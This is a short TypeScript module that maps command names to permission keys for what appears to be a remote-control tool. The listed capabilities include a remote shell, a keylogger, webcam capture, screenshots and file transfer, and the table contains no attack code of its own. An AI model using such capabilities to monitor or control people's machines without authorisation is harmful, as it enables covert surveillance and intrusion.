import type { Permissions } from "@/src/repository/db/clientPermisions/clientPermission.schema";

export const permissionsAdapter: Record<string, Permissions> = {
  "upload-file": "uploadFile",
  "get-screens": "screenshot",
  "send-screenshot": "screenshot",
  explorer: "explorer",
  file: "getFile",
  tasks: "process",
  cmd: "shell",
  keylogger: "keylogger",
  cameras: "cameras",
  "camera-screenshot": "cameras",
};
